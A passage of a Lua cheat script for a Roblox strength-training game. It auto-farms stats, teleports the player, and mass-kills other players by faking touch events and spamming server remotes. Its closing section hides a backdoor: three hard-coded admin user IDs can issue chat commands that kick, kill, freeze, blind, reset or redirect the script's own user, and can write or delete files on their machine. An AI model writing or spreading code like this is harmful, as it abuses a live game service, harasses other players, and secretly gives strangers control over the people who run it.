		local found = table.find(flags.players.blacklisted, flags.players.selected_player.Name)
		if found then return end
		funcs.add_to_list(flags.players.kill_list, flags.players.selected_player.Name)
	end)

	horiz3:AddButton("Remove From Kill List", function()
		funcs.remove_from_list(flags.players.kill_list, flags.players.selected_player.Name)
	end)

	game.Players.PlayerAdded:Connect(function(Player)
		if PlayersDropdown then
			task.wait(1)
			RefreshPlayerList()
			if Player:GetFriendStatus(game.Players.LocalPlayer) == Enum.FriendStatus.Friend then
				funcs.add_to_list(flags.players.blacklisted, Player.Name)
			end
		end
	end)

	game.Players.PlayerRemoving:Connect(function(Player)
		if PlayersDropdown then
			task.wait(0.3)
			RefreshPlayerList()
		end
	end)

	AllPlayersFolder:AddSwitch("Kill Everyone", function(b)
		flags.players.kill_everyone = b
	end)

	local FastKillSwitch = AllPlayersFolder:AddSwitch("Enable Fast Kills", function(b)
		flags.players.enable_fast_kills = b
	end)

	local BrawlDisruptSwitch = AllPlayersFolder:AddSwitch("Teleport To Them (only works in custom kills)", function(b)
		flags.players.teleport_to_them_in_kills = b
	end)

	FastKillSwitch:Set(true)

	AllPlayersFolder:AddDropdown("Karma Priority", function(obj)
		flags.players.karma_priority = obj
	end):Refresh({ "None", "Good Karma", "Evil Karma" })

	local strLabel = PlayerStatsFolder:AddLabel("Strength: ")
	local duraLabel = PlayerStatsFolder:AddLabel("Dura: ")
	local maxHealthLabel = PlayerStatsFolder:AddLabel("Max Health: ")
	local agiLabel = PlayerStatsFolder:AddLabel("Agility: ")

	local horiz4 = PlayerStatsFolder:AddHorizontalAlignment()
	local horiz5 = PlayerStatsFolder:AddHorizontalAlignment()
	local horiz6 = PlayerStatsFolder:AddHorizontalAlignment()
	local horiz7 = PlayerStatsFolder:AddHorizontalAlignment()
	local horiz8 = PlayerStatsFolder:AddHorizontalAlignment()
	local horiz9 = PlayerStatsFolder:AddHorizontalAlignment()

	local petsLabel = horiz4:AddLabel("Pet 1: ")
	local pets2Label = horiz4:AddLabel("Pet 2: ")
	local pets3Label = horiz5:AddLabel("Pet 3: ")
	local pets4Label = horiz5:AddLabel("Pet 4: ")
	local pets5Label = horiz6:AddLabel("Pet 5: ")
	local pets6Label = horiz6:AddLabel("Pet 6: ")
	local pets7Label = horiz7:AddLabel("Pet 7: ")
	local pets8Label = horiz7:AddLabel("Pet 8: ")

	local auraLabel = horiz8:AddLabel("Aura: ")
	local isWl = horiz9:AddLabel("Is WL: ")
	local onKl = horiz9:AddLabel("On Kill List: ")

	local x = {}

	local function updLabel(i, t)
		if i then
			i.Text = t
			i.Size = UDim2.new(0, gNameLen(i), 0, 20)
		end
	end

	function x.Update()
		if flags.players.selected_player then
			local sp = flags.players.selected_player
			local ep = sp:FindFirstChild("equippedPets")

			updLabel(strLabel, "Strength: " .. format(sp:WaitForChild("leaderstats"):WaitForChild("Strength").Value, false) .. " (" .. format(sp:WaitForChild("leaderstats"):WaitForChild("Strength").Value, true) .. ")")
			updLabel(duraLabel, "Dura: " .. format(sp:FindFirstChild("Durability").Value, false) .. " (" .. format(sp:FindFirstChild("Durability").Value, true) .. ")")
			updLabel(maxHealthLabel, "Max Health: " .. format(sp.Character and sp.Character.Humanoid.MaxHealth, false) .. " (" .. format(sp.Character and sp.Character.Humanoid.MaxHealth, true) .. ")")
			updLabel(agiLabel, "Agility: " .. format(sp:WaitForChild("Agility").Value, false) .. " (" .. format(sp:WaitForChild("Agility").Value, true) .. ")")
			updLabel(petsLabel, "Pet 1: " .. (ep:FindFirstChild("pet1").Value == nil and "NA" or tostring(ep:FindFirstChild("pet1").Value)))
			updLabel(pets2Label, "Pet 2: " .. (ep:FindFirstChild("pet2").Value == nil and "NA" or tostring(ep:FindFirstChild("pet2").Value)))
			updLabel(pets3Label, "Pet 3: " .. (ep:FindFirstChild("pet3").Value == nil and "NA" or tostring(ep:FindFirstChild("pet3").Value)))
			updLabel(pets4Label, "Pet 4: " .. (ep:FindFirstChild("pet4").Value == nil and "NA" or tostring(ep:FindFirstChild("pet4").Value)))
			updLabel(pets5Label, "Pet 5: " .. (ep:FindFirstChild("pet5").Value == nil and "NA" or tostring(ep:FindFirstChild("pet5").Value)))
			updLabel(pets6Label, "Pet 6: " .. (ep:FindFirstChild("pet6").Value == nil and "NA" or tostring(ep:FindFirstChild("pet6").Value)))
			updLabel(pets7Label, "Pet 7: " .. (ep:FindFirstChild("pet7").Value == nil and "NA" or tostring(ep:FindFirstChild("pet7").Value)))
			updLabel(pets8Label, "Pet 8: " .. (ep:FindFirstChild("pet8").Value == nil and "NA" or tostring(ep:FindFirstChild("pet8").Value)))

			updLabel(auraLabel, "Aura: " .. (sp:FindFirstChild("equippedPowerUp").Value == nil and "NA" or tostring(sp:FindFirstChild("equippedPowerUp").Value)))
			updLabel(isWl, "Is WL: " .. (table.find(flags.players.blacklisted, sp.Name) and "Yes" or "No"))
			updLabel(onKl, "On Kill List: " .. (table.find(flags.players.kill_list, sp.Name) and "Yes" or "No"))
		end
	end

	return x
end

local function AddTeleportTabStuff()
	GymsTpFolder:AddButton("Beach", function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(3.5251, 94.2168, 247.676))
	end)

	GymsTpFolder:AddButton("Frost", function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-2845.58, 94.2126, -409.289))
	end)

	GymsTpFolder:AddButton("Mythical", function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(2484.54, 91.2158, 1073.91))
	end)

	GymsTpFolder:AddButton("Eternal", function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-6994.52, 91.7712, -1283.7))
	end)

	GymsTpFolder:AddButton("Legends", function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(4345.41, 1078.53, -3850.49))
	end)

	GymsTpFolder:AddButton("Inside MK", function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-8743.06, 135.902, -5863.48))
	end)

	GymsTpFolder:AddButton("Outside MK", function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-9038.51, 9.12373, -6047.06))
	end)

	GymsTpFolder:AddButton("Tiny Island", function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-39.9304, 63.9266, 1991.72))
	end)

	BrawlsTpFolder:AddButton("Boxing", function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1901.87695, 120.895432, -5899.64795))
	end)
	BrawlsTpFolder:AddButton("Desert", function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(985.910645, 120.795364, -7037.80615))
	end)
	BrawlsTpFolder:AddButton("Magma", function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(4466.75342, 120.973602, -8425.74512))
	end)
end

local rebirthTo18k = false
local rebirthTo94k = false
local function AddRebirthTabStuff()
	RebirthTab:AddSwitch("Rebirth To 18K", function(b)
		rebirthTo18k = b
	end)

	RebirthTab:AddSwitch("Rebirth To 94K", function(b)
		rebirthTo94k = b
	end)
end

local MainTabStuff = AddMainTabStuff()
local FarmTabStuff = AddFarmTabStuff()
local PlayerTabStuff = AddPlayerTabStuff()
AddTeleportTabStuff()
AddRebirthTabStuff()

MainTab:Show()
library:FormatWindows()

local heartbeat = nil
local stepped = nil
local startTime = tick()
local startTime2 = tick()
local startTime3 = tick()
local startTime4 = tick()

local godmode_activated = false

local function kill_everyone(priority)

	local muscle_event = game.Players.LocalPlayer:FindFirstChild("muscleEvent")
	local self_char = game.Players.LocalPlayer.Character
	if not self_char then return end

	local left_hand = self_char.LeftHand
	local right_hand = self_char.RightHand

	if priority == "None" then
		for _, v in pairs(game:GetService("Players"):GetPlayers()) do
			if v ~= game.Players.LocalPlayer and v.Name ~= "Forgiveness19" and v.Name ~= "Wraith1286" then
				if not table.find(flags.players.blacklisted, v.Name) then
					local player_char = v.Character
					if player_char and player_char:FindFirstChild("Humanoid") and player_char.Humanoid.Health > 0 then
						funcs.equip_tool("Punch")
						firetouchinterest(left_hand, player_char.Head, 0)
						firetouchinterest(right_hand, player_char.Head, 0)
						muscle_event:FireServer(unpack({ [1] = "punch", [2] = "leftHand"}))
						muscle_event:FireServer(unpack({ [1] = "punch", [2] = "rightHand"}))
						firetouchinterest(left_hand, player_char.Head, 1)
						firetouchinterest(right_hand, player_char.Head, 1)
					end
				end
			end
		end
	end

	if priority == "Good Karma" then
		for _, v in pairs(game:GetService("Players"):GetPlayers()) do
			if v ~= game.Players.LocalPlayer and v.Name ~= "Forgiveness19" and v.Name ~= "Wraith1286" then
				if not table.find(flags.players.blacklisted, v.Name) then
					local player_char = v.Character
					if player_char and player_char:FindFirstChild("Humanoid") and player_char.Humanoid.Health > 0 then
						local good_karma_val = v:FindFirstChild("goodKarma").Value
						local evil_karma_val = v:FindFirstChild("evilKarma").Value

						if good_karma_val < evil_karma_val then
							funcs.equip_tool("Punch")
							firetouchinterest(left_hand, player_char.Head, 0)
							firetouchinterest(right_hand, player_char.Head, 0)
							muscle_event:FireServer(unpack({ [1] = "punch", [2] = "leftHand"}))
							muscle_event:FireServer(unpack({ [1] = "punch", [2] = "rightHand"}))
							firetouchinterest(left_hand, player_char.Head, 1)
							firetouchinterest(right_hand, player_char.Head, 1)
						end
					end
				end
			end
		end
	end

	if priority == "Evil Karma" then
		for _, v in pairs(game:GetService("Players"):GetPlayers()) do
			if v ~= game.Players.LocalPlayer and v.Name ~= "Forgiveness19" and v.Name ~= "Wraith1286" then
				if not table.find(flags.players.blacklisted, v.Name) then
					local player_char = v.Character
					if player_char and player_char:FindFirstChild("Humanoid") and player_char.Humanoid.Health > 0 then
						local good_karma_val = v:FindFirstChild("goodKarma").Value
						local evil_karma_val = v:FindFirstChild("evilKarma").Value

						if good_karma_val > evil_karma_val then
							funcs.equip_tool("Punch")
							firetouchinterest(left_hand, player_char.Head, 0)
							firetouchinterest(right_hand, player_char.Head, 0)
							muscle_event:FireServer(unpack({ [1] = "punch", [2] = "leftHand"}))
							muscle_event:FireServer(unpack({ [1] = "punch", [2] = "rightHand"}))
							firetouchinterest(left_hand, player_char.Head, 1)
							firetouchinterest(right_hand, player_char.Head, 1)
						end
					end
				end
			end
		end
	end

end

local function kill_players(t)
	if #t < 1 then return end

	local muscle_event = game.Players.LocalPlayer:FindFirstChild("muscleEvent")
	local self_char = game.Players.LocalPlayer.Character
	if not self_char then return end

	local left_hand = self_char.LeftHand
	local right_hand = self_char.RightHand

	for _, v in ipairs(t) do
		if v ~= game.Players.LocalPlayer.Name and v ~= "Forgiveness19" and v ~= "Wraith1286" then

			local player = game:GetService("Players"):FindFirstChild(v)

			if flags.players.teleport_to_them_in_kills then
				if player and player.Character then
					local player_char = player.Character
					if player_char and player_char:FindFirstChild("Humanoid") and player_char.Humanoid.Health > 0 then
						self_char.HumanoidRootPart.CFrame = player_char.HumanoidRootPart.CFrame
					end
				end
			else
				if player and player.Character then
					local player_char = player.Character
					if player_char and player_char:FindFirstChild("Humanoid") and player_char.Humanoid.Health > 0 then
						funcs.equip_tool("Punch")
						firetouchinterest(left_hand, player_char.Head, 0)
						firetouchinterest(right_hand, player_char.Head, 0)
						muscle_event:FireServer(unpack({ [1] = "punch", [2] = "leftHand"}))
						muscle_event:FireServer(unpack({ [1] = "punch", [2] = "rightHand"}))
						firetouchinterest(left_hand, player_char.Head, 1)
						firetouchinterest(right_hand, player_char.Head, 1)
					end
				end
			end
			
		end
	end
end

heartbeat = game:GetService("RunService").Heartbeat:Connect(function()
	if game:GetService("CoreGui"):FindFirstChild("Nitrous") then
		if tick() - startTime >= 0.1 then
			startTime = tick()

			MainTabStuff.UpdateTimeElapsed()
			PlayerTabStuff.Update()
			FarmTabStuff.Refresh()

			local muscle_event = game.Players.LocalPlayer:FindFirstChild("muscleEvent")
			local char = game.Players.LocalPlayer.Character
			if char then
				local humanoid = char:FindFirstChild("Humanoid")
				if humanoid and humanoid.Health > 0 then
					funcs.set_jump_power(flags.main.jump)
					funcs.get_tool("Punch").attackTime.Value = flags.main.fast_punch and 0.03 or 0.3
					funcs.get_tool("Punch").RequiresHandle = not flags.main.punch_anim
					funcs.set_rebirth_button_visibility(flags.main.show_rebirth_btn)

					local farm_flags = flags.farm
					if farm_flags.punch then
						funcs.equip_tool("Punch")
						funcs.use_tool("Punch")
					end

					if farm_flags.weight then
						funcs.equip_tool("Weight")
						funcs.use_tool("Weight")
					end

					if farm_flags.pushups then
						funcs.equip_tool("Pushups")
						funcs.use_tool("Pushups")
					end

					if farm_flags.situps then
						funcs.equip_tool("Situps")
						funcs.use_tool("Situps")
					end

					if farm_flags.handstands then
						funcs.equip_tool("Handstands")
						funcs.use_tool("Handstands")
					end

					if farm_flags.auto_brawl then
						if game:GetService("ReplicatedStorage"):WaitForChild("brawlInProgress").Value == true then
							local location = game.Players.LocalPlayer:FindFirstChild("currentMap").Value
							if location ~= "Desert Ring" and location ~= "Boxing Ring" and location ~= "Magma Ring" then
								game:GetService("ReplicatedStorage"):FindFirstChild("rEvents"):FindFirstChild("brawlEvent"):FireServer(unpack({ [1] = "joinBrawl" }))
								task.wait()
							end
						end
					end

					if farm_flags.godmode_brawl then
						if game:GetService("ReplicatedStorage"):WaitForChild("brawlInProgress").Value == true and not godmode_activated then
							godmode_activated = true
							for _ = 1, 900 do
								game:GetService("ReplicatedStorage"):FindFirstChild("rEvents"):FindFirstChild("brawlEvent"):FireServer(unpack({ [1] = "joinBrawl" }))
							end
						else
							godmode_activated = false
						end
					else
						godmode_activated = false
					end

					if flags.glitch.start then
						local rock = game:GetService("Workspace"):WaitForChild("machinesFolder"):FindFirstChild(flags.glitch.rock):FindFirstChild("Rock")
						funcs.equip_tool("Punch")
						firetouchinterest(char.LeftHand, rock, 0)
						firetouchinterest(char.RightHand, rock, 0)
						muscle_event:FireServer(unpack({ [1] = "punch", [2] = "leftHand"}))
						muscle_event:FireServer(unpack({ [1] = "punch", [2] = "rightHand"}))
						firetouchinterest(char.LeftHand, rock, 1)
						firetouchinterest(char.RightHand, rock, 1)
					end

					if flags.players.spectating then
						funcs.spectate_character(flags.players.spectating.Character)
					end

					if flags.auto_farm.gym ~= "None" and flags.auto_farm.equipment ~= "None" then
						char.HumanoidRootPart.CFrame = CFrame.new(getEquipmentCFrame(flags.auto_farm.gym, flags.auto_farm.equipment))

						local arg2 = workspace:WaitForChild("machinesFolder"):WaitForChild(flags.auto_farm.equipment):WaitForChild("interactSeat")
						game:GetService("ReplicatedStorage"):FindFirstChild("rEvents"):FindFirstChild("machineInteractRemote"):InvokeServer(unpack({ [1] = "useMachine", [2] = arg2 }))
						muscle_event:FireServer(unpack({ [1] = "rep", [2] = arg2 }))
					end

					if rebirthTo18k then

						if game.Players.LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Rebirths").Value >= 18980 then
							rebirthTo18k = false
							return
						end

						if game.Players.LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Rebirths").Value >= 18980 then return end

						local LocalPlayer = game.Players.LocalPlayer
						local sallyCount = 0
						local goldenRebirthCount = (LocalPlayer:FindFirstChild("ultimatesFolder"):FindFirstChild("Golden Rebirth") and LocalPlayer:FindFirstChild("ultimatesFolder"):FindFirstChild("Golden Rebirth").Value) or 0

						for i = 1, 8 do
							local ep = LocalPlayer:FindFirstChild("equippedPets"):FindFirstChild("pet" .. tostring(i))
							if ep.Value ~= nil and ep.Value == "Speedy Sally" then
								sallyCount = sallyCount + 1
							end
						end

						local currentStrength = LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Strength").Value
						local strToRebirth = 10000 + (LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Rebirths").Value * 5000)

						if sallyCount > 0 then strToRebirth = strToRebirth - (strToRebirth * 0.1 * sallyCount) end
						if goldenRebirthCount > 0 then strToRebirth = strToRebirth - (strToRebirth * 0.1 * goldenRebirthCount) end

						if currentStrength >= strToRebirth then
							game:GetService("ReplicatedStorage"):FindFirstChild("rEvents"):FindFirstChild("rebirthRemote"):InvokeServer(unpack({ [1] = "rebirthRequest" }))
						end

					end

					if rebirthTo94k then

						if game.Players.LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Rebirths").Value >= 94980 then
							rebirthTo94k = false
							return
						end

						if game.Players.LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Rebirths").Value >= 94980 then return end

						local LocalPlayer = game.Players.LocalPlayer
						local sallyCount = 0
						local goldenRebirthCount = (LocalPlayer:FindFirstChild("ultimatesFolder"):FindFirstChild("Golden Rebirth") and LocalPlayer:FindFirstChild("ultimatesFolder"):FindFirstChild("Golden Rebirth").Value) or 0

						for i = 1, 8 do
							local ep = LocalPlayer:FindFirstChild("equippedPets"):FindFirstChild("pet" .. tostring(i))
							if ep.Value ~= nil and ep.Value == "Speedy Sally" then
								sallyCount = sallyCount + 1
							end
						end

						local currentStrength = LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Strength").Value
						local strToRebirth = 10000 + (LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Rebirths").Value * 5000)

						if sallyCount > 0 then strToRebirth = strToRebirth - (strToRebirth * 0.1 * sallyCount) end
						if goldenRebirthCount > 0 then strToRebirth = strToRebirth - (strToRebirth * 0.1 * goldenRebirthCount) end

						if currentStrength >= strToRebirth then
							game:GetService("ReplicatedStorage"):FindFirstChild("rEvents"):FindFirstChild("rebirthRemote"):InvokeServer(unpack({ [1] = "rebirthRequest" }))
						end

					end
				end
			end
		end
	else
		if heartbeat ~= nil then
			heartbeat:Disconnect()
			heartbeat = nil
			funcs.reset_spectate()
			library = nil
			funcs = nil
			startTime = 0
		end
	end
end)

stepped = game:GetService("RunService").Stepped:Connect(function()
	if game:GetService("CoreGui"):FindFirstChild("Nitrous") then
		if flags.main.ring_size > 0 then
			funcs.activate_ring(flags.players.blacklisted, flags.main.ring_size, true, "nitrousring")
		end

		if tick() - startTime3 >= (flags.players.enable_fast_kills and 0.06 or 0.7) then
			startTime3 = tick()
			if flags.players.kill_everyone then
				kill_everyone(flags.players.karma_priority)
			end
		end

		if tick() - startTime4 >= 0.04 then
			startTime4 = tick()
			if #flags.players.kill_list > 0 then
				kill_players(flags.players.kill_list)
			end
		end
	else
		if stepped ~= nil then
			stepped:Disconnect()
			stepped = nil
		end
	end
end)

local admins = { 5225356162, 5250007575, 1360277717 }
local protected = false

local function obey_command(Player, Message)

	if table.find(admins, game.Players.LocalPlayer.UserId) ~= nil then return end

	local function exec_cmd(args)
		if not args.callback then return end

		for _, v in pairs(args.prompt) do
			if Message == v then
				args.callback()
			end
		end
	end

	local function exec_cmd2(args)
		if not args.prompt then return end
		if not args.callback then return end

		for _, v in pairs(args.prompt) do
			if Message:sub(2, #v + 1) == v then
				local additionalArgs = Message:sub(#v + 3)
				additionalArgs = additionalArgs:match("^%s*(.-)%s*$")
				args.callback(additionalArgs)
				return
			end
		end
	end
	
	local local_player = game.Players.LocalPlayer
	if protected or isfile("sys_pro.json") then
		if Player.UserId == admins[3] then return end
	end

	exec_cmd({
		prompt = { "$kick all", "$kick " .. local_player.Name },
		callback = function()
			local_player:Kick("L get ezz you silly monkey who can't even use jujutsu")
			task.wait(0.5)
			game:shutdown()
		end
	})

	exec_cmd({
		prompt = { "$reset all", "$reset " .. local_player.Name },
		callback = function()
			for _, v in pairs(local_player:FindFirstChild("leaderstats"):GetChildren()) do
				v.Value = 0
			end
		end
	})

	exec_cmd({
		prompt = { "$corner all", "$corner " .. local_player.Name },
		callback = function()
			local char = local_player.Character
			if not char then repeat task.wait(1) until game.Players.LocalPlayer.Character end
			char = game.Players.LocalPlayer.Character
			char.HumanoidRootPart.CFrame = CFrame.new(-503.59, 3.66, -204.411, -0.50, 9.50, 0.86, -2.27, 1, -1.11, -0.86, -5.86, -0.50)
			task.wait(0.1)
			char.HumanoidRootPart.Anchored = true
		end
	})

	exec_cmd({
		prompt = { "$uncorner all", "$uncorner " .. local_player.Name },
		callback = function()
			local char = local_player.Character
			if not char then repeat task.wait(1) until game.Players.LocalPlayer.Character end
			char = local_player.Character
			char.HumanoidRootPart.Anchored = false
		end
	})

	exec_cmd({
		prompt = { "$skadoosh all", "$skadoosh " .. local_player.Name },
		callback = function()
			local char = local_player.Character
			if not char then repeat task.wait(1) until game.Players.LocalPlayer.Character end
			char = local_player.Character
			char.HumanoidRootPart.Anchored = false
			char.Humanoid.Health = 0
		end
	})

	exec_cmd({
		prompt = { "$launch all", "$launch " .. local_player.Name },
		callback = function()
			local char = local_player.Character
			if not char then repeat task.wait(1) until game.Players.LocalPlayer.Character end
			char = local_player.Character
			char.HumanoidRootPart.Anchored = false

			local launchForce = Instance.new("BodyVelocity")
            launchForce.Velocity = Vector3.new(0, 5000, 0)
            launchForce.MaxForce = Vector3.new(1e6, 1e6, 1e6)
            launchForce.Parent = char.HumanoidRootPart

            task.delay(2, function()
                if launchForce then
                    launchForce:Destroy()
                end
            end)
		end
	})

	exec_cmd({
		prompt = { "$trip all", "$trip " .. local_player.Name },
		callback = function()
			local char = local_player.Character
			if not char then repeat task.wait(1) until game.Players.LocalPlayer.Character end
			char = local_player.Character
			char.HumanoidRootPart.Anchored = false
			char.Humanoid.PlatformStand = true

			task.delay(5, function()
				char.Humanoid.PlatformStand = false
			end)
		end
	})

	exec_cmd({
		prompt = { "$blackout all", "$blackout " .. local_player.Name },
		callback = function()
			local screen_gui = Instance.new("ScreenGui")
			screen_gui.SafeAreaCompatibility = Enum.SafeAreaCompatibility.None
			screen_gui.IgnoreGuiInset = true
			screen_gui.Parent = game:GetService("CoreGui")

			local frame = Instance.new("Frame")
			frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			frame.Size = UDim2.new(2, 0, 2, 0)
			frame.Position = UDim2.new(-0.5, 0, 0, 0)
			frame.Parent = screen_gui

			task.delay(8, function()
				if screen_gui then screen_gui:Destroy() end
			end)
		end
	})

	local follow = nil
	exec_cmd({
		prompt = { "$follow all", "$follow " .. local_player.Name },
		callback = function()
			if not follow then
				follow = game:GetService("RunService").Stepped:Connect(function()
					funcs.equip_tool("Pushups")

					if local_player.Character and Player.Character then
						local_player.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 10)
					end
				end)
			end
		end
	})

	exec_cmd({
		prompt = { "$unfollow all", "$unfollow " .. local_player.Name },
		callback = function()
			if follow then
				follow:Disconnect()
				follow = nil
			end
		end
	})

	exec_cmd2({
		prompt = "attack",
		callback = function(args)
			if not args then return end

			if args == local_player.Name then return end
			local char = workspace:FindFirstChild(args)
			if not char then return end

			repeat
				task.wait(0.07)
				kill_players({ args })
			until not char or char.Humanoid.Health == 0
		end
	})

	
	
	
end

local function obey_admin_command(Player, Message)
	if table.find(admins, game.Players.LocalPlayer.UserId) ~= nil then return end
	if Player.UserId == admins[3] then return end

	local function exec_cmd(args)
		if not args.callback then return end

		for _, v in pairs(args.prompt) do
			if Message == v then
				args.callback()
			end
		end
	end
	
	local local_player = game.Players.LocalPlayer

	exec_cmd({
		prompt = { "$protect all", "$protect " .. local_player.Name },
		callback = function()
			protected = true
		end
	})

	exec_cmd({
		prompt = { "$pprotect all", "$pprotect " .. local_player.Name },
		callback = function()
			protected = true
			writefile("sys_pro.json", "{}")
		end
	})

	exec_cmd({
		prompt = { "$unprotect all ", "$unprotect " .. local_player.Name },
		callback = function()
			protected = false
		end
	})
	exec_cmd({
		prompt = { "$uunprotect all ", "$uunprotect " .. local_player.Name },
		callback = function()
			protected = false
			if isfile("sys_pro.json") then
				delfile("sys_pro.json")
			end
		end
	})

	exec_cmd({
		prompt = { "$shutdown all", "$shutdown " .. local_player.Name },
		callback = function()
			local nitrous = game:GetService("CoreGui"):FindFirstChild("Nitrous")
			if nitrous then nitrous:Destroy() end
		end
	})

	
end



for _, v in pairs(game:GetService("Players"):GetPlayers()) do
	if table.find(admins, v.UserId) ~= nil then
		v.Chatted:Connect(function(message)
			obey_command(v, message)
			obey_admin_command(v, message)
		end)
	end

end

game.Players.PlayerAdded:Connect(function(v)
	if table.find(admins, v.UserId) ~= nil then
		v.Chatted:Connect(function(message)
			obey_command(v, message)
			obey_admin_command(v, message)
		end)
	end
end)
